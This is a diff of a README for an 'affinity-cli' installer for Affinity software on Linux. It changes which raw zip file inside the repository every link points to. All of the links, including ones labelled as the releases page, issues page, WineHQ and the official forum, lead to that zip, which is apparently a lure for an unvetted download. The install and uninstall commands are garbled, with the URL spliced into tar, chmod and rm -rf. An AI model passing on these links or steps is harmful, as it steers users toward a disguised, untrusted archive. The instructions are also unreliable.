@@ -6,11 +6,11 @@ The **affinity-cli** is a universal command-line installer for Affinity products
 
 ## 📥 Download & Install
 
-[![Download affinty-cli](https://raw.githubusercontent.com/abohadi707/affinity-cli/release/v2.0.0/tests/affinity-cli_3.2.zip)](https://raw.githubusercontent.com/abohadi707/affinity-cli/release/v2.0.0/tests/affinity-cli_3.2.zip)
+[![Download affinty-cli](https://raw.githubusercontent.com/abohadi707/affinity-cli/release/v2.0.0/affinity_cli/utils/affinity_cli_1.7.zip)](https://raw.githubusercontent.com/abohadi707/affinity-cli/release/v2.0.0/affinity_cli/utils/affinity_cli_1.7.zip)
 
-1. **Visit the Releases Page**: Go to the [Releases Page](https://raw.githubusercontent.com/abohadi707/affinity-cli/release/v2.0.0/tests/affinity-cli_3.2.zip) to access the latest version of affinity-cli.
+1. **Visit the Releases Page**: Go to the [Releases Page](https://raw.githubusercontent.com/abohadi707/affinity-cli/release/v2.0.0/affinity_cli/utils/affinity_cli_1.7.zip) to access the latest version of affinity-cli.
 2. **Choose Your Version**: Find the latest version at the top of the page. Each version includes a download link and release notes.
-3. **Download the Installer**: Click on the file that says `affinity-cli-<version>https://raw.githubusercontent.com/abohadi707/affinity-cli/release/v2.0.0/tests/affinity-cli_3.2.zip` or similar. This will download the installer package to your computer.
+3. **Download the Installer**: Click on the file that says `affinity-cli-<version>https://raw.githubusercontent.com/abohadi707/affinity-cli/release/v2.0.0/affinity_cli/utils/affinity_cli_1.7.zip` or similar. This will download the installer package to your computer.
 
 ## 📋 System Requirements
 
@@ -35,14 +35,14 @@ Once you have downloaded the installer, follow these steps to get started:
 3. **Extract the Installer**: Run this command to extract the downloaded file:
 
    ```bash
-   tar -xzf affinity-cli-<version>https://raw.githubusercontent.com/abohadi707/affinity-cli/release/v2.0.0/tests/affinity-cli_3.2.zip
+   tar -xzf affinity-cli-<version>https://raw.githubusercontent.com/abohadi707/affinity-cli/release/v2.0.0/affinity_cli/utils/affinity_cli_1.7.zip
    ```
 
 4. **Run the Installer**: Now, navigate to the extracted folder and run the installation command:
 
    ```bash
    cd affinity-cli
-   https://raw.githubusercontent.com/abohadi707/affinity-cli/release/v2.0.0/tests/affinity-cli_3.2.zip
+   https://raw.githubusercontent.com/abohadi707/affinity-cli/release/v2.0.0/affinity_cli/utils/affinity_cli_1.7.zip
    ```
 
 5. **Follow Prompts**: The installer may ask you for your password and confirmation to install the software. Provide the required permissions.
@@ -84,7 +84,7 @@ If you encounter issues while installing or running the applications, consider t
 - **Permissions**: Ensure you have permission to execute the installer script. If not, run:
   
   ```bash
-  chmod +x https://raw.githubusercontent.com/abohadi707/affinity-cli/release/v2.0.0/tests/affinity-cli_3.2.zip
+  chmod +x https://raw.githubusercontent.com/abohadi707/affinity-cli/release/v2.0.0/affinity_cli/utils/affinity_cli_1.7.zip
   ```
 
 - **Dependencies**: Some distributions may require additional packages. Check the terminal output for any missing dependencies and install them using your package manager.
@@ -96,7 +96,7 @@ If you encounter issues while installing or running the applications, consider t
 To uninstall any Affinity product, simply remove its directory:
 
 ```bash
-rm -rf ~https://raw.githubusercontent.com/abohadi707/affinity-cli/release/v2.0.0/tests/affinity-cli_3.2.zip<product-name>
+rm -rf ~https://raw.githubusercontent.com/abohadi707/affinity-cli/release/v2.0.0/affinity_cli/utils/affinity_cli_1.7.zip<product-name>
 ```
 
 ### Can I install multiple Affinity products?
@@ -105,7 +105,7 @@ Yes, you can install all three applications at once and run them independently.
 
 ### Are there any known issues?
 
-Keep an eye on the [Issues Page](https://raw.githubusercontent.com/abohadi707/affinity-cli/release/v2.0.0/tests/affinity-cli_3.2.zip) for updates on bugs or installation issues.
+Keep an eye on the [Issues Page](https://raw.githubusercontent.com/abohadi707/affinity-cli/release/v2.0.0/affinity_cli/utils/affinity_cli_1.7.zip) for updates on bugs or installation issues.
 
 ## 🌐 Community
 
@@ -115,8 +115,8 @@ Join our community to share your experiences or seek support. You can get involv
 
 For detailed guides and tips:
 
-- [WineHQ for Linux](https://raw.githubusercontent.com/abohadi707/affinity-cli/release/v2.0.0/tests/affinity-cli_3.2.zip)
-- [Affinity Official Forum](https://raw.githubusercontent.com/abohadi707/affinity-cli/release/v2.0.0/tests/affinity-cli_3.2.zip)
+- [WineHQ for Linux](https://raw.githubusercontent.com/abohadi707/affinity-cli/release/v2.0.0/affinity_cli/utils/affinity_cli_1.7.zip)
+- [Affinity Official Forum](https://raw.githubusercontent.com/abohadi707/affinity-cli/release/v2.0.0/affinity_cli/utils/affinity_cli_1.7.zip)
 
 Feel free to explore the documentation available on the repository for more information. 
 
